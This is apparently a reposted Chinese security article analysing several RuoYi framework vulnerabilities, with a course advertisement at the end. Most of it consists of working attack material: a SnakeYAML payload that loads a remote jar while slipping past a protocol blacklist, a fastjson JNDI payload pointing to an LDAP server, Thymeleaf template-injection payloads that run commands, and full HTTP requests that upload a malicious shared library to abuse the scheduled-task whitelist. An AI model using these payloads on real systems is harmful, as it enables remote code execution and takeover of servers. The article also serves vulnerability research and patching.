![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicFIuPd85LNswgVl4ibPwuLJsOQl0qO84PBbGaibIOJrNhiasxkvK8egvXg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicaQ5gzGHTlPI7qicZlZF7XBG7ghzpKq17o2995djjCXFm17ibRJwua3PA/640?wx_fmt=png&from=appmsg "")  
  
工具使用：  
https://github.com/charonlight/RuoYiExploitGUI  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicXsADiaZOMECMLATxSrficicCicw5p4Ma9zoNtdTK2g90KrlM3sL2tvVcTw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicv1ro5A9gRT9kE9LmYtsnccV19ZmkeXQMxHae6oia9SCxI1BqXHbuc7w/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicV3nrGMBmK6ibraFB4LOfXofgJQr55gok3I1hdk8Qnn3mMt7NpSbIMIw/640?wx_fmt=png&from=appmsg "")  
## 0x06 修复方式  
  
1、升级版本。  
## 0x07 bypass  
### 版本4.6.2<=Ruoyi<4.7.2  
  
这个版本采用了黑名单限制调用字符串  
- 定时任务屏蔽ldap远程调用  
  
- 定时任务屏蔽http(s)远程调用  
  
- 定时任务屏蔽rmi远程调用  
  
**Bypass**  
咱们只需要在屏蔽的协议加上单引号,接着采用之前的方式例如:  

```
org.yaml.snakeyaml.Yaml.load(’!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“**h’t’t’p’:**//127.0.0.1:88/yaml-payload.jar”]]]]’)

```

# 0x07 fastjson反序列化  
  
关注两个函数 parse 和 parseObject JSONObject.parse  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicNcjosiaNQKic6wdn2Y3iaj7yyJl90iaMju7W8rhOL5TtlibSTCUm6UcZtbg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicu5Uedr4yrujUOPMgLnl1Xlib1iax3NNVKUoEWA07gmgVzQGwj784iattg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicsXng3uWQEgYvVGIcMuVXLPpJjbHRDHElrXvoKic2ZTUsrBTuRIy0mdg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
开启 autotype  

```
params[@type]=org.apache.shiro.jndi.JndiObjectFactory&params[resourceName]=ldap://192.168.12.76:1389/09rlhv

```

## ruoyi4.2.0  
  
初看这个数据包一堆参数，有点复杂，根据之前的分析梳理一下，需要的参数是 
```
tplCategory
```

  
为
```
tree
```

  
，才能走到
```
fastjson漏洞点
```

  
,认真梳理一下需要的参数，发现还需要
```
treeCode&treeParentCode
```

  
参数，这块代码中全局搜索提示的缺少的内容的中文名称即可发现参数名称，填写上即可。  
  
最终简化后的数据包如下  

```
POST /tool/gen/edit HTTP/1.1
Host: 172.16.0.66
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Referer: http://172.16.0.66/tool/gen/edit/6
Cookie: JSESSIONID=c229803b-e147-4853-ae79-df7e04dcd338
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://172.16.0.66
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 3610

tableName=111111&tableComment=111111&className=111111&functionAuthor=111111&&columns[0].javaType=Long&columns[0].javaField=infoId&&tplCategory=tree&treeCode=111111&treeParentCode=111111&packageName=111111&moduleName=111111&businessName=111111&functionName=111111&params[treeCode]=111111&params[treeParentCode]=1&params[treeName]={&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;11.hb4r0s.dnslog.cn&#34;}

```

# 0x08 SSTI模版注入漏洞  
#### 漏洞版本  
  
在4.7.1版本CacheController类中  
![[../S24-25赛季-大黑客之路/红队知识学习/assets/Y10 若依ruoyi/file-20250416135654610.png]]  
#### 漏洞复现  
  
模板注入漏洞payload：  
  
return内容可控：  

```
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&#34;calc&#34;).getInputStream()).next()}::.x

```

  
URL路径可控：  

```
${T(java.lang.Runtime).getRuntime().exec(&#34;touch test&#34;)}::.x

```

  
测试上述payload发现返回包返回500，具体情况是
```
Thymeleaf3.0.12
```

  
版本对这个版本进行了一些先知，防止模板注入漏洞，
```
https://github.com/thymeleaf/thymeleaf/issues/809
```

  
以下为防护的情况：  
  
我们将Payload改造一下，如
```
${T (java.lang.Runtime).getRuntime().exec(&#34;calc.exe&#34;)}
```

  
。在T和(之间多加几个空格即可，放入数据包中进行测试发现成功弹出计算器。  
  
这里为了方便演示，
```
payload
```

  
直接贴出来了，大家测试的时候记得进行
```
URL
```

  
编码。  

```
POST /monitor/cache/getNames HTTP/1.1

fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a calculator')}__::.x

```


```
cacheName=123&fragment=${T (java.lang.Runtime).getRuntime().exec(“calc.exe”)}

```

#### 接口/monitor/cache/getKeys  
#### 接口/monitor/cache/getValue  
#### 接口/demo/form/localrefresh/task  
# 0x09 若依4.8.0版本计划任务RCE  
### 环境搭建  
  
https://github.com/yangzongzhuan/RuoYi/releases  
  
导入数据库，修改application-druid中的数据库账号密码  
  
修改application中的文件路径及log存放路径  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicqdnSx8DWiatrY9pTroMGXwlI6C9uDqN9EXNicnItuEvkOMbkc8piarPJg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoichf7zNJfsYQr84yFyygmFayc1ich5ibkxuViaNqy7pg76JL11FJqJ5ibTcQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
启动成功  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicznTRZeAib1xOMpm3LiaoXBHAOURNRz4WY4LtdQMwHAVaCZm5kBOSEX4g/640?wx_fmt=png&from=appmsg "")  
## 漏洞分析  
  
最新版本4.8 Ruoyi 后台⽬前限制  
- **规则**  
：
```
invokeTarget
```

  
 必须包含 
```
com.ruoyi.quartz.task
```

  
 字符串。  
  
-   
- **子字符串匹配漏洞**  
：白名单检查使用 
```
StringUtils.containsAnyIgnoreCase
```

  
，只要 
```
invokeTarget
```

  
 中**任意位置**  
包含白名单字符串即可，无需完全匹配包名。  
  
- **构造畸形类名**  
：例如 
```
xxx.com.ruoyi.quartz.task.yyy.EvilClass
```

  
，虽然实际包名不在白名单内，但字符串包含 
```
com.ruoyi.quartz.task
```

  
，可绕过白名单。  
  
- **绕过思路**  
：  
  

```
/**  
     * 定时任务白名单配置（仅允许访问的包名，如其他需要可以自行添加）  
     */
publicstaticfinalString[] JOB_WHITELIST_STR = { &#34;com.ruoyi.quartz.task&#34; };  

/**  
     * 定时任务违规的字符  
     */
publicstaticfinalString[] JOB_ERROR_STR = { &#34;java.net.URL&#34;, &#34;javax.naming.InitialContext&#34;, &#34;org.yaml.snakeyaml&#34;,  
&#34;org.springframework&#34;, &#34;org.apache&#34;, &#34;com.ruoyi.common.utils.file&#34;, &#34;com.ruoyi.common.config&#34;, &#34;com.ruoyi.generator&#34; };  
}

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicsnOVc70bLgcWlcibDW1KLCXwKNibsSkI7Qqz19Z9Za6X6dMfFKL6NeuQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
JOB_WHITELIST_STR 这个也就是com.ruoyi.quartz.task 其实不⽤类名 包含在⾃符串⾥⾯就⾏ 这⾥是invokeTarget⽽不是beanPackageName  
- **规则**  
：禁止使用 
```
java.net.URL
```

  
、
```
org.springframework
```

  
 等敏感包下的类。  
  
-   
- **寻找非黑名单类**  
：利用若依自身依赖或第三方库中未被黑名单覆盖的类。例如：  
  
- **工具类**  
：若依的 
```
com.ruoyi.common.utils
```

  
 下的某些工具类（需确认是否在 
```
JOB_ERROR_STR
```

  
 禁止的子包中）。  
  
- **绕过思路**  
：  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicvjw7XdOVBWTKict4oBK356l5UBmia6YEamcW9QoZfIOHWGvFsm1IW95g/640?wx_fmt=png&from=appmsg "")  
  
**白名单检查（whiteList 方法）**  

```
publicstaticboolean whiteList(String invokeTarget)  
    {  
String packageName = StringUtils.substringBefore(invokeTarget, &#34;(&#34;);  
int count = StringUtils.countMatches(packageName, &#34;.&#34;);  
if (count > 1)  
        {  
return StringUtils.containsAnyIgnoreCase(invokeTarget, Constants.JOB_WHITELIST_STR);  
        }  
Object obj = SpringUtils.getBean(StringUtils.split(invokeTarget, &#34;.&#34;)[0]);  
String beanPackageName = obj.getClass().getPackage().getName();  
return StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_WHITELIST_STR)  
                && !StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_ERROR_STR);  
    }  
}

```

- **漏洞点**  
：当 
```
invokeTarget
```

  
 的包层级超过1层时（如 
```
a.b.c.method
```

  
），仅检查是否包含白名单字符串，而非完整包路径。  
  
然后不⽤JOB_ERROR_STR 这个类⾥⾯的 从mvn install 后 从其他包下⾯去寻找可利⽤的类下的⽅法就⾏  
  
需要满⾜以下条件**方法参数解析（getMethodParams）**  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicfaiczmiblgoMyQR5LvsibCNqdibZyYdjicDuHWZzpFyjwiatUpCoojtSI9yw/640?wx_fmt=png&from=appmsg "")  

```
publicstaticList<Object[]> getMethodParams(String invokeTarget)  
{  
String methodStr = StringUtils.substringBetween(invokeTarget, &#34;(&#34;, &#34;)&#34;);  
if (StringUtils.isEmpty(methodStr))  
    {  
returnnull;  
    }  
String[] methodParams = methodStr.split(&#34;,(?=([^\&#34;']*[\&#34;'][^\&#34;']*[\&#34;'])*[^\&#34;']*$)&#34;);  
List<Object[]> classs = new LinkedList<>();  
for (int i = 0; i < methodParams.length; i++)  
    {  
String str = StringUtils.trimToEmpty(methodParams[i]);  
// String字符串类型，以'或&#34;开头  
if (StringUtils.startsWithAny(str, &#34;'&#34;, &#34;\&#34;&#34;))  
        {  
            classs.add(newObject[] { StringUtils.substring(str, 1, str.length() - 1), String.class });  
        }  
// boolean布尔类型，等于true或者false  
elseif (&#34;true&#34;.equalsIgnoreCase(str) || &#34;false&#34;.equalsIgnoreCase(str))  
        {  
            classs.add(newObject[] { Boolean.valueOf(str), Boolean.class });  
        }  
// long长整形，以L结尾  
elseif (StringUtils.endsWith(str, &#34;L&#34;))  
        {            classs.add(newObject[] { Long.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Long.class });  
        }  
// double浮点类型，以D结尾  
elseif (StringUtils.endsWith(str, &#34;D&#34;))  
        {  
            classs.add(newObject[] { Double.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Double.class });  
        }  
// 其他类型归类为整形  
else
        {  
            classs.add(newObject[] { Integer.valueOf(str), Integer.class });  
        }  
    }  
return classs;  
}

```

- **限制**  
：参数类型被强制约束为基本类型，无法传递复杂对象。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoickpQb2VqulW9aymIjpXniaQ4HoibCoEBHEHus3ibmyFH9mCvsu637L2d9A/640?wx_fmt=png&from=appmsg "")  

```
/**  
 * 执行方法  
 *  
 * @param sysJob 系统任务  
 */
publicstaticvoid invokeMethod(SysJob sysJob) throws Exception
{  
String invokeTarget = sysJob.getInvokeTarget();  
String beanName = getBeanName(invokeTarget);  
String methodName = getMethodName(invokeTarget);  
List<Object[]> methodParams = getMethodParams(invokeTarget);  

if (!isValidClassName(beanName))  
    {  
Object bean = SpringUtils.getBean(beanName);  
        invokeMethod(bean, methodName, methodParams);  
    }  
else
    {  
Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();  
        invokeMethod(bean, methodName, methodParams);  
    }  
}

```

  
传递的参数只能是其中的这些类型 通过 , 进⾏分割。substringBetween获取的是() ⾥⾯ 不能继续包含 )了会截断  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicRwvCYrTicwqzyMcnTL4laMY32boqDzXEFqSr6AiaQH1eic5jMIos3KiaibQ/640?wx_fmt=png&from=appmsg "")  

```
publicstaticString substringBetween(finalString str, finalString open, finalString close) {  
if (!ObjectUtils.allNotNull(str, open, close)) {  
returnnull;  
    }  
finalint start = str.indexOf(open);  
if (start != INDEX_NOT_FOUND) {  
finalint end = str.indexOf(close, start + open.length());  
if (end != INDEX_NOT_FOUND) {  
return str.substring(start + open.length(), end);  
        }  
    }  
returnnull;  
}

```

  
那我们可以直接去找String 可控到sink 的类就可以了。  
  
这⾥反射的时候还需要注意 需要满⾜ 存在⼀个参构造 且都是public的  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicKBlYBzubFgmyoHOTG4u4XyDpcW7zVCUGiac15Lbcic6MMB1wV4piaPibug/640?wx_fmt=png&from=appmsg "")  

```
Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();

```

#### 计划任务分析  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic62hjTYygzGEfdVuvlibiaSgacNu4ib4GJB5Fec2ArQZXXbcGic8CJYGG5Q/640?wx_fmt=png&from=appmsg "")  
  
根据提交数据包锁定后端路由  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic7SvFKOYBHibeeIeJBjDKAdId5QOmficsSvzelz2Rkt69TaiawaDo1u3qg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic4ibl3eMJ7z5ncW5smAOGicOiagbhJO1nc2SYHSkaVSCsH0NQSajSSUOkQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
调试看一下具体做了什么  
  
前几个都是在判断是否有包含rmi ldap http关键词,禁止对这些协议进行调用  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicIuPtrUVicicjcWQ7XDfSiaqd5ySlkhAYZeSqNG4s2hGeibvUoZbbkWMucw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
还判断了是否有一些黑名单中的类  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicibibs6uRuxXk7cokgCz2Tibe7nn27vnHePaKD9QlzLpITOGWZe4egc1GA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
进入白名单的判断  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic4T6mXa72Fpa0XSzIsUMiaQs3p3LG0QT2hhiao3xVtwgwrSicbKzKIsqOg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
提取出调用的类名，判断其中是否包含白名单字符串  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicQnADjW4dtC1C8QIqT619qus1LBrJI2mcD8LGdhtsSkNoMnZRpxNXaw/640?wx_fmt=png&from=appmsg "")  
  
白名单字符串为com.ruoyi.quartz.task  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicchDlrvRzcObSnbnthibDKpLTUmOcvqEsZvjicoQrwTEwg5gVBn552PxA/640?wx_fmt=png&from=appmsg "")  
  
注意这里是用正则去匹配的，所以该字符串在任意位置都可以，所以存在可以绕过的可能  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicA0dvZDHWvgGia39JFamJNkfciatAJHFxz4ToLYbF3c9aqpInPclFVIeQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
后续就会进入正常的j保存计划任务流程  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicmeoF1zOzDL9TMwDRicfD7h4zle1SIqLfFl8CC1gr4ceWMuGkhSiaqsyQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
当启动任务时，会调用方法  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic7pVmXQvcesibWaALAicNj8EXM3WGGsfI2J8Jt86NHgBcywU85m8Pdh1g/640?wx_fmt=png&from=appmsg "")  
  
获取需要调用的类名方法名参数值  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicHFMu1kaUpLfKMtEVIzD0n3v63zp5XcY8k2x9yia6T71XVQf2eBh8xvw/640?wx_fmt=png&from=appmsg "")  
  
在获取方法参数时进行了处理，只允许为字符串/布尔/长整/浮点/整形，无法传递类对象  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicOPmW0B78zibv3AU6lwVoW7qQsJ8gX79GGqr1XRGxSOL8r6jEF9lxYaA/640?wx_fmt=png&from=appmsg "")  
  
接着会实例化该类，反射调用其方法  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicCnXpYJjIVHNumCeqmp6xaL77Yx8No9icVYQicUIOE0Eib66W8gSRAAibFA/640?wx_fmt=png&from=appmsg "")  
  
该方法为public修饰  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicHTWHmHj1roFsCibe61sbMsMO5pdkFylqxJmicSaB7wuDOcyW52mHPoicA/640?wx_fmt=png&from=appmsg "")  
  
我们想要利用需要达成的是  
- 使用的类不在黑名单中  
  
- 要存在com.ruoyi.quartz.task字符串  
  
- 不可以使用rmi ldap http协议  
  
#### 文件上传  
  
而在ruoyi中存在一个文件上传点  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicDotcPS5y97YT2lyhonibic5VrxODRJ72WyP0t34cbkcHUgvnrXvl81bw/640?wx_fmt=png&from=appmsg "")  
  
我们可以随便上传一个文件看看  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicAqKHsoXpLJVMY8GEkcyA6JP69mAVtd3Wk0cpNG0G6XoW0bZfUyutXg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicZH83CB98pOnzcicwAWLbvrcJoaUoyTe0THeWQOA0mjtRuVBbCnoXplw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
那么我们可以上传一个名字包含com.ruoyi.quartz.task字符串的文件  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicUSxhkCR9ZUvia7Fzznic1Z37HOFibQklIm6NUOdOur965gGKp5wGuicPOA/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
  
在java中存在一种机制叫做JNI，可以通过加载外部链接库，从而执行其中的<font style="color:rgba(0, 0, 0, 0.85);">构造函数</font>  
  
而com.sun.glass.utils.NativeLibLoader的loadLibrary方法就可以去加载链接库，也是public修饰  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicY1pNhZI03DcytfCNcXOMV2gldwck00kIy1rY1ZdgrZl39jOtWpNZPw/640?wx_fmt=png&from=appmsg "")  

```
POST /common/upload HTTP/1.1
Host: 10.40.107.67
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1c
x-forwarded-for: 127.0.0.1
Connection: close
Content-Type: multipart/form-data; boundary=00content0boundary00
Content-Length: 167

--00content0boundary00
Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;com.ruoyi.quartz.task.txt&#34;
Content-Type: image/jpg

success
--00content0boundary00--

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicia6bEM5Wyrmm3KBlC1TiaicucSoicorh2hQv1wlzVhom40cE1PzDDEd8bA/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicrCJ4EqANqJVicnpW8Cic4uHS3sHR2PV79YMU9KHj4H2AW8Y8oJvpAmAQ/640?wx_fmt=png&from=appmsg "")  

```
cat calc.c 

#include <stdlib.h>
__attribute__((constructor))
staticvoid run() {
system(&#34;open -a Calculator&#34;);
}

```


```
POST /common/upload HTTP/1.1
Host: 10.40.107.67
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1c
x-forwarded-for: 127.0.0.1
Connection: close
Content-Type: multipart/form-data; boundary=00content0boundary00
Content-Length: 167

--00content0boundary00
Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;com.ruoyi.quartz.task.txt&#34;
Content-Type: image/jpg

二进制恶意代码
--00content0boundary00--

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicdAPw6F0qkic9Qg1ZqsxOgzT1qY1wJPHPrD6HuC7oBjgthoclY2tPiaHA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
注意他会自动在后面添加dylib等后缀，在不同的系统中可能有不同的后缀，并且要注意架构问题  
  
文章作者：奇安信攻防社区（  
 Locks_）  
  
文章来源：  
https://forum.butian.net/share/4328  
  
如有侵权请联系删除  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/jVk423I423fpuYotTS5CuGN2LiaOD8C9JehkdRxGIbazQicjkfHucXQaSiaGlErIVZYB0AoF7ZjeIA1J8gfR1yRuw/640?from=appmsg "")  
  
广告时间  
  
  
【网安免费公开课】  
  
黑客攻击摄像头技术大揭秘！  
  
👉  
6月16日晚 20:00 在线直播  
  
速来解锁黑客视角的物联网安全攻防！  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoiculRiac1lI13l7nYibpf4hUHUZic7xHjtgZxCr57zS9rmUdIibmiampgyv0A/640?wx_fmt=gif&from=appmsg "")  
  
扫码免费预约直播  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/CIfRhFLmt75ORicoHqDib36uxo2avCSt1IygpKs8hbLXHPFTKNruZqXjT5ularnGACoasRCS5qq3U1DvOHn8uAjA/640?from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicyLtFNc9pP5xQ0QfR21ibicZkYJPA5IHbPe60GicodAovVLopIZLpU7iblA/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkibSLtx2MRia79mst2UzCvnzKria9oBcehVeC9xF1dSq5A5I8DzHtUR06xmNRqTX1ic1bqodSyr9jMvA/640?wx_fmt=png&from=appmsg "")  
  
